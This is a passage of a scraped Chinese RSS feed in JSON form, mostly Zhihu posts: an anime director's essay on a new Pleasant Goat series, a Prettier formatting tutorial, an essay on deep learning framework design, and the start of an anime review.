15:30:07","description":"\n<p>作品名：四维人看的漫画是啥样的？   作品类别：关于四维空间的脑洞   作者：ZCloud</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b0aed3b33937d1f64c4b063a03ac5e05_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"4628\" data-watermark=\"watermark\" data-original-src=\"v2-b0aed3b33937d1f64c4b063a03ac5e05\" data-watermark-src=\"v2-1150dd922e3371284864d2cf8076fae4\" data-private-watermark-src=\"v2-1206b028572a58a6777494214996b75f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-68510626a218630199722ccdf91a1f27_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"7122\" data-watermark=\"watermark\" data-original-src=\"v2-68510626a218630199722ccdf91a1f27\" data-watermark-src=\"v2-e175470c088c2e9b7c57dc22b7195c46\" data-private-watermark-src=\"v2-2f770fe8f8001d60b651e82a32ac8161\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zcloud1985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ZCloud</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/357158336?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何引导父母一起看动画和漫画？</a><br><a href=\"http://www.zhihu.com/question/332956635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">求推荐一些好看不火的动画或者漫画?</a><br>\n","link":"http://www.zhihu.com/question/472178904/answer/2000086901?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价7月播出的《喜羊羊与灰太狼之决战次时代》？","date":"2021-07-15 11:30:07","description":"\n<p>      大家好，我是《喜羊羊与灰太狼》总导演黄伟明。又到暑假，喜羊羊的新系列如约而至，这次推出的《决战次时代》，羊羊们将去到未来的“次时代”冒险，给大家呈现不一样的羊村和羊狼角色！感谢大家的支持与厚爱，《决战次时代》播出4天芒果TV点击率破亿，登上优酷全站热搜和少儿榜单热度第一，羊羊团队会继续努力做好内容来回馈大家的支持！</p>\n<h3><b>《喜羊羊与灰太狼》十六周年</b></h3>\n<h3><b>送给你我的一场成年礼：未来的你也可以成为自己最喜欢的样子</b></h3>\n<p>     《决战次时代》是一个和时空有关的故事，讲述了喜羊羊与灰太狼意外来到十五年后的此事后，为了重塑历史，回到自己的时空，与其他长大后的小羊们齐心收集能源石碎片，守护家园的故事.《羊村守护者》系列已经来到第四季了，什么样的题材才能不断给观众不一样的惊喜是创作团队一直在思考的事情。怎样去避免故事模式化，“突破羊守系列的传统，给观众带来点惊喜！”，于是团队一致决定，这一次跨时空之旅要做一场“成人礼”！把《决战次时代》定位在：成长与未来。小羊们一改趣萌可爱的小羊形象，加上城市化、科技化的场景元素，打开了大家对羊守系列乃至《喜羊羊与灰太狼》世界观的全新想象。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cf2e49aadb8f873dfed2cd860e7f5f2c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cf2e49aadb8f873dfed2cd860e7f5f2c\" data-watermark-src=\"v2-92225664d8d07e48cb4c2dece196bcba\" data-private-watermark-src=\"v2-9237c4f2e6e3dc86f1806ccfcaf0bc4a\"></p>\n<p>    为什么说是“成人礼”？今年是《喜羊羊与灰太狼》的16周年，羊狼们的形象一直深入人心，年纪虽小但却勇敢正义守护家园，一直陪伴大家的成长，大家对小羊们“多大了”这个问题也一直充满兴趣，十五年过去了，小羊们是时候长大了！因此，创作团队就决定：让大家见证一下十五年后，走上社会的小羊和大家见面，一起守护十五年后的家园。这一次无论是在动画世界里还是我们故事创作，动画制作上都是一次很大的尝试和挑战。      </p>\n<p>   比如长大后的小羊形象，在创作初期，我们构想设计过许多小羊长大后形象，那究竟怎样才符合长大后的他们呢？才能做出合理的变化？<b>在我看来，作为家喻户晓的国民动画IP，我们角色形象的突破要建立在角色固有的DNA上，不能纯粹为了“博眼球”而变。一方面要有新鲜度和惊喜感，另一方面也要保持角色积累十五年来的原始设定。</b>在几番讨论过后，我们决定以梦想和职业为切入点：从“大肥羊学校”到进入“次时代社会”这必然是一个飞越的改变，有了职业身份的变化就能合理化地去塑造新的形象。而职业的设定我们也是顺延他们小时候的想法，从它们从小的品格特点延展和发挥开来的，比如暖羊羊当上了形象转变十分大的歌星是因为她喜欢唱歌，喜欢歌星扁嘴伦，一直想成为勇敢自信的自己，所以从默默付出到登上舞台，自信健康的暖羊羊成为了本次角色形象中改变最大的一只羊。   </p>\n<p><img src=\"https://pic2.zhimg.com/v2-b43145848f14497ed10d9cecffde0bbb_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b43145848f14497ed10d9cecffde0bbb\" data-watermark-src=\"v2-978be4e58259a1f45385cb25ac92661c\" data-private-watermark-src=\"v2-d4f4c0c05dd976da17468475aa29bf5a\"></p>\n<p>    同时，我觉得童年的梦是美好的，也是最难以坚持的，所以我们还想借小羊们长大后实现梦想来让大家知道：心中的种子可以发芽开花结果，你也可以成为你自己喜欢的样子。只要努力追求，坚持热爱，梦想成真，理想实现并不只是童话而已！所以，<b>我觉得长大后的他们应该是他们从小向往，努力奔赴的样子，是观众们一直期盼的样子。  </b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e9e25949d3d86f9f26f4d3b70824c827_720w.jpeg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e9e25949d3d86f9f26f4d3b70824c827\" data-watermark-src=\"v2-14961783441e0b7f76605e60cd4ee7e9\" data-private-watermark-src=\"v2-d8334910ac80bfc8dab39a09ef48235b\"></p>\n<h3><b>适当的留白，让角色的未来充满无限可能</b></h3>\n<p>     我看到有些观众在问：为什么没有设定喜羊羊长大呢？喜羊羊的成长有些许不同的，他有经历过不同时期，性格也有发生不同的转变，比起其他小羊，喜羊羊更加多面，因此每个人心里留下的，喜欢的喜羊羊都是不一样的，也许有人认为他调皮淘气可爱，认为他成熟懂事，未来他会上太空还是留在草原守护家园，大家对他的期望和想象都很广很大，<b>所以我们并不想就此框定了所有羊狼，在塑造角色的过程中给观众留下一个空白，</b>借用主角视角来开启这一场时代之旅，让大家代入到喜羊羊的角色去看其他同伴的成长变化，然后<b>去想象未来的自己</b>。这一次时代之旅过后，相信大家心里也有了自己的“次时代喜羊羊”了吧？喜羊羊也会有属于他的光明未来，至于长大后的他会是什么样呢？就留给大家想象啦！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9540ba08f3c33e58241019ac0b25b592_720w.gif?rss\" data-rawwidth=\"717\" data-rawheight=\"420\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9540ba08f3c33e58241019ac0b25b592\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>与角色一同呼吸一同成长，在细节中挖掘故事深度</b></h3>\n<p>     从《决战次时代》首播到现在，大家最关切的一看点莫过于灰太狼和小灰灰的亲情羁绊，也是我们着力刻画的情感点，过程中也有过担心忧虑：昔日亲情浓厚的狼堡父子变得冷漠仇恨是否会让观众不习惯？但矛盾和失去是我们成长过程中必经阶段，经得起风雨的感情才令人倍感珍惜，将更加浓烈。实际上，小灰灰也并不是真正讨厌，不在意灰太狼，只是太爱爸爸而无法接受他离去的十五年，在沟通，互吐心声后的两父子就释怀了，从而一同并肩作战守护家园。希望通过故事传达出珍惜当下，父母们和孩子之间更多陪伴与沟通，关注孩子的成长，培养孩子优良的品质，父母和孩子一起进步。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eabce0cf9f590bb49386feed50d039fe_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eabce0cf9f590bb49386feed50d039fe\" data-watermark-src=\"v2-8c026c0927c1bea3427e65b47e68f47f\" data-private-watermark-src=\"v2-ecdc1960a78135abbe280ab0e2c0d7d4\"></p>\n<p>     除了父子情感线外，羊羊们和机器人反派之间也铺满了细节伏笔，细心的观众能从中发现不少彩蛋和线索，可能是一个镜头，一句不起眼的台词，都有精心设计，大家可以一起在剧中去挖掘和发现。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bee409e1867b5f15623526aeace1e957_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bee409e1867b5f15623526aeace1e957\" data-watermark-src=\"v2-05de8057b4ae1a5fef465a5b0539e970\" data-private-watermark-src=\"v2-2a5fcecd244bb70b6534d078306c2540\"></p>\n<h3><b>突破创新，不忘初心：经典角色相继露面上演“回忆杀”！</b></h3>\n<p>   《决战次时代》是一次全新的创作突破，也是经典的回归，我们向前出发，但坚持初心。那些陪伴了大家十五年的经典角色也会在剧里相继露面，比如15年前那只爱吃香蕉的蕉太狼，抢戏的草原三恶霸，路人王小飞机等等，还有大电影里深受大家喜爱的动人歌曲《星光下的梦想》和《知己》也会在本剧里有“重头戏”，相信这些熟悉的身影和声音都会勾起观众们对喜灰十五年经典时刻的回忆。大家可以在观看的过程中多注意，找找我们藏下的小彩蛋。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6df1b905de26dd199037eccccaeb3f36_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6df1b905de26dd199037eccccaeb3f36\" data-watermark-src=\"v2-6f3d77f463c7a23c8a40a250172bd169\" data-private-watermark-src=\"v2-d60473f79d1c264e2b12db639ee12c82\"></p>\n<h3><b>打破次元壁，借动漫之力传播城市文化</b></h3>\n<p>     创作来源于生活，这次《决战次时代》的主场景来到了繁华的现代化科技城市，团队在场景设计上也下足了功夫。作为土生土长在“羊城”广州的动漫IP，很多设计师在广州生活多年,设计师们将他们的生活“日常场景”还原到作品设计中，让动画场景看上去更接地气，有生活感和真实感。同时，通过动画片传播城市文明和文化魅力。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3d3ab494ad48a14dc548eba357e2a7c6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3d3ab494ad48a14dc548eba357e2a7c6\" data-watermark-src=\"v2-19916679a22a20f713928f5201efedc0\" data-private-watermark-src=\"v2-6fd67d18446164f1e35bd67a277b13ff\"></p>\n<h3>\n<b>羊羊的长大代表完结？喜灰小时候的故事还会继续吗？</b> </h3>\n<p>     次时代只是羊狼故事里的其中一段旅程，是对未来的展望，是新的开始，而不是结束。无论过去十五年还是以后的更多个十五年，变的是不断前进的脚步，不变的是原创动力团队对大家的感谢和坚持原创的初心！我们的大电影也就在前方，向大家飞奔而来，相信不久之后活力新鲜的羊狼就会在大荧幕跟和大家见面啦！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b24debf01ab8cd6a5f889b802fa2eaa_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0b24debf01ab8cd6a5f889b802fa2eaa\" data-watermark-src=\"v2-34fb175de9cc90e3803919d702082639\" data-private-watermark-src=\"v2-c10480141fefa9582a82b43adb2f2a05\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/huang-wei-ming-leohuang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">黄伟明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">48 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/446647681?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你们觉得现在《喜羊羊与灰太狼》有可能崛起吗 ？</a><br><a href=\"http://www.zhihu.com/question/265931334?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《喜羊羊与灰太狼》里有什么细思极恐的细节？</a><br>\n","link":"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"关于深度学习框架的一些自己见解","date":"2021-07-13 13:15:08","description":"\n<p>上次写博客还是10多年前，然后还险些出现了事故，所以就一直没有写了。一晃就10几年过去了，虽然有时候看着一些知乎大咖（前同事等）在消费我们原来做的一些事情，很想回应几句，但是最后也是不了了之。最近团队一位知乎大咖去创业了，所以为了团队的建设，所以决定开始写写自己对于系统领域的一些感悟，也希望通过这个能够让大家更加理解我们团队，以及分享我本人对于系统的一些理解。纯属自己的观点，大家有不同观点，欢迎指正和讨论。</p>\n<p>我一直工作在分布式系统的领域，从大数据到AI工程，其实有不少做系统的我们这行的人，很多都有这个路径，所以第一篇就先聊聊自己一个感悟，说说最近做的深度学习框架，算是开一个头。</p>\n<p>我觉得做深度学习框架其实有两个派别的人，一派是从分布式系统的人来做的，另外一派是从做算法的人来做的。不同的人的背景不同，所以做这个事情的角度也会不同，从而产生不同门派。tensorflow属于系统派，而pytorch属于算法派。像我们这种做系统，特别是做过超大规模分布式系统的人，往往最担心的就是要对一个已经部署在成千上万台的计算集群上的平台软件需要做重大重构，这个中间困难没有做过这个事情的人可能不会太有体感，这么大一个平台，公司不可能财力让你能够去镜像一个集群去做任务的迁移，并且越大公司的平台上用户数众多，业务都会耦合在一起去完成公司的使命，基本上你不可能有时间点可以让全公司的业务团队放下他们自己手头的优先级来配合你做这种迁移，哪怕你工程能力非常强，这种迁移中间不会出现任何意外。何况很复杂系统要做到这一点基本上是很难的。所以我们做系统的，往往会把系统设计得更加具有可扩展性，从而尽最大可能去避免这种大的重构和推倒重来。当我们在面对需要构建一个深度学习框架的时候，我们第一时间就在设想这个框架需要能够从规模上很好支持分布式，能够很好的扩展到任意大的深度模型的框架，我们希望构建一个系统，能够像人脑一样能够把视觉，语音，语言等多种模型能够一同训练。其实这个就是tensorflow这样系统构造的时候的原始想法，把整个计算构成一个Tensor的Flow图。因为分布式本身就很复杂，需要处理各种节点相互的数据和执行中的各种依赖关系。这些事情由人来写代码，太繁琐且容易出错，所以自然地，我们就会设想由系统来负责这种依赖关系。这也就是为什么我们希望整个分布式执行的计划是一个静态图，然后系统再根据用户指定的或者系统智能的决定的placement进行分图，并在这些分图中添加合适的Send-Recv的Op从而构成一个分布式的执行计划。但是这样的设计理念也会带来一些困恼，我们在模型训练时候有时候有些类似控制图的部分，在这种设计理念下，我们必须要把这些控制流图的代码也op化，然后把这些op也整体串联在Tensor的Flow执行图中，大家有兴趣了解细节的话也可以看看我的老朋友也是前同事Yuan Yu写的文章：<a href=\"https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1805.01772\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Dynamic Control Flow in Large-Scale Machine Learning, Eurosys2018.</a>  但是这种方式会使得一些习惯单机开发的研究人员觉得比较晦涩。同时也是因为分布式的原因，我们做系统的很自然会把模型的开发过程分成构图和执行两个阶段。构图的时候只是生成一个逻辑执行计划，然后通过显式方式的提交（或者execute）过程进行执行。这种方式让研究人员觉得不能一边写代码一边就能够马上看到代码片段的结果，所以这也造成很多人诟病TensorFlow的模式不太容易debug自己的模型程序，其实这也是因为分布式带来负担。但是也是因为TensorFlow是静态图的方式，其可以做到训推一体，在训练出来的模型能够导出模型图，并且在这个图上进行系统化的推理优化从而能够非常方便部署到线上。这个系统性化的方法带来另外一个优势。</p>\n<p>框架的另外一派是算法派，特别是感知类模型（图像，语音，语言类）训练，因为这类训练一般都是同步训练，然后“分布式训练”也不像前者那样设想是任意异构的分布式执行图（即每个分布式节点的执行逻辑可以不同），因为是数据并行，这样我们就可以利用MPI的AllReduce的通讯源语来进行梯度的汇集计算。算法同学需要是一种丰富的可扩展的在GPU上能够很好运行的，并且能够很好进行自动梯度的算子库，并且因为面向是数据并行的场景，这样话在神经网络部分其实都是单机程序，从而可以利用任何python的语法糖去构建任何的动态的训练控制逻辑（大家也把这种称作动态图），对于算法研究人员来讲，这种方式写代码比较随性也方便debug，所以在研究界pytorch得到大量的关注和使用。</p>\n<p>刚才说过TensorFlow从设计之初就在考虑可以超大的模型分布式训练的场景，但是没有预想到硬件的发展也非常迅速，显存越来越大以及训练技术的发展，还有非常精细化优化显存的工作，比如DeepSpeed等把optimizer所需要的显存sharding化掉，使得除了超大规模稀疏模型训练外，感知类的SOTA模型一直可以利用数据并行的方式来进行训练。从而使得TensorFlow这种设计理念看上去有overdesign的嫌疑。并且就算超大规模稀疏模型训练，因为TensorFlow整体化的设计理念，不把Parameter Server作为游离在Flow图之外，使得他在超大规模场景下的scalability上出现了问题，从而催生一堆自建PS+深度学习框架的（稀疏）模型训练框架。这是另外一个话题，我会在日后写一写在这个领域上我们一些工作。</p>\n<p>好在随着transformer的出现，我们终于有方法能够回归到最初那个梦想，使得我们可以把多种数据（视觉的，文字的）合在一起训练多模态的模型，因为问题规模的增大，必然需要更多参数的模型来支持，所以我们迅速将模型大小从几十亿增加到万亿规模，这个时候就必然需要能够支持很好模型并行框架，这也是为什么最近这个领域重新变得火热，比如类似OneFlow，MindSpore，PaddlePaddle，Mesh Tensorflow，GShard，以及我们阿里的Whale框架。</p>\n<p>其实从设计理念来看，模型并行正是回归到原来TensorFlow一开始设计时候的设想，只是那个时候因为模型并行的需求不够，没有必要提供比较好高层自动分布式的抽象，写模型的人还是可以自己精细化去构造每个计算节点的子图，整体上TensorFlow的框架只是负责把这些子图能够自动通过Send-Recv进行连接，并且在Runtime能够合法的进行计算。而现在，因为需求增多，算法迭代需求的增多，迫切需要一种高层次的自动分布式框架，从而使得算法同学能够去快速简单构造一个逻辑图的方式去构造自己神经网络，而由系统层来帮助他来进行复杂模型并行的构成。所以其实可以看到TensorFlow的设计理念正好就是为这个考虑的，利用静态图，我们可以逻辑性去描述一个网络训练，然后在执行时候在进行系统化的分图和分布式训练。所以说自动分布式的需求并没有超越原来设计的基本范畴，也是因为这样，我们采取和谷歌Gshard类似技术路线去提供自动分布式的能力。正是站在原有框架基础上去做增量。</p>\n<p>不同于GShard更加关注于谷歌TPU集群，我们关注于异构的GPU集群，这里所说异构是因为我们不如谷歌这么有钱，构建非常大的同构化TPU集群，我们集群中有不同年代的GPU和CPU，这些GPU各自算力和显存都大小不一。也正是因为这样，其实给我们系统提出更大挑战，我们在进行自动分布式时候需要在cost model上考虑好这些差异点。这样才能做到比较优化的分布式训练。这也是我们自动分布式框架Whale一种差异性和核心能力之一。</p>\n<p>其实系统派的框架和算法派的框架也在进行一定的融合，TensorFlow提出了Eager模式，通过TF.function在eager模式下可能单步执行计算，得到Tensor来提高可调式性；而Pytorch通过Trace或者Parse的方式转化为TorchScript的图描述，从而能够更好支持训练到推理的工程化。但是这种动静结合其实只是在一定层次的，比如如果考虑分布式，Trace的方式去得到TorchScript就不足够。需要进一步去限制构图能够使用的API，这也是像NV的megatron以及微软DeepSpeed在Pytorch上去支持分布式所带来的一些约束，感兴趣的可以读读OneFlow的Blog：《<a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/IN281OPUEOI12ge3hOvvTw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GPT-3难以复现，为什么说PyTorch走上了一条“大弯路”？”》</a></p>\n<p>总结下我的观点：我觉得现在深度学习框架主要流行的两个TensorFlow和Pytorch是有其设计理念的原因的。我们做Whale正是在这种理解的基础上进行路线选择，并且认为应该站在已有的工作基础上去做增量的东西。而不是再去造一个别人做过的轮子。接下来我还陆续展开我们分布式框架Whale，大规模稀疏模型训练工作，编译系统Ansor和DISC，以及我们如何把分布式，编译和调度有机结合方面一系列系统工作，敬请关注。如果大家对于我们PAI团队的工作有兴趣，非常欢迎和我们联系，我的邮箱是weilin.lw@alibaba-inc.com</p>\n<p>PS：写Blog写的不多，还需要多训练，感觉有点虎头蛇尾的，呵呵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/backom?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">backom</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/375634204?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年4月动画《本田小狼与我》？","date":"2021-07-12 11:30:10","description":"\n<p>看到鱼总 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/2452e1e547fa65b32f1365943337d619\" data-hash=\"2452e1e547fa65b32f1365943337d619\" data-hovercard=\"p$b$2452e1e547fa65b32f1365943337d619\">@鱼缸里的沫沫鱼</a> 吐槽了，我也忍不住了，来批评两句。</p>\n<p>第一集孤独清冷的氛围感营造的极为出色，修正水平也相当不错，还原了博老师人物原案的魅力，再加上KAI社上一季刚做出了一部无可指摘的《赛马娘 第二季》，所以我起初的期待是放到《摇曳露营》精神续作这一水平线上的。</p>\n<p>最后发现除了在修得烂这一点上堪称青出于蓝而胜于蓝之外，本田小狼和马娘二期完全是两回事。</p>\n<p>一方面是演出手段的贫乏，空气系空气系不是说连演出都空掉了，相反由于空气系作品的故事相对薄弱，其实往往更需要高浓度的演出来保障观感。可惜本田小狼的演出只有三板斧：换滤镜、古典乐、同ポ（与之前的Cut使用同样的镜头位置、构图），而且都在第一集用过了，到中后期明显感到黔驴技穷。</p>\n<p><b>换滤镜</b></p>\n<p>当然换滤镜只是个说法，真正想要做到这种滤镜效果也没那么简单，本片监督藤井俊郎4年前在《18IF》演出回里就用过了类似的手法:</p>\n<p><img src=\"https://pic3.zhimg.com/v2-24bd5e45cca1617a55f88a09c2a3c94e_720w.png?rss\" data-caption=\"18if ep3\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"405\" data-watermark=\"original\" data-original-src=\"v2-24bd5e45cca1617a55f88a09c2a3c94e\" data-watermark-src=\"v2-6cb088e29f475a2e1b783ecc8df5cff5\" data-private-watermark-src=\"v2-81d4dbdde8691fe0bfe3b6908a116de5\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b90d42bfa1d5024d40234c3e6fbd8ffb_720w.png?rss\" data-caption=\"本田小狼\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-b90d42bfa1d5024d40234c3e6fbd8ffb\" data-watermark-src=\"v2-5d590db1e0a8dee613895cdc2c438bb1\" 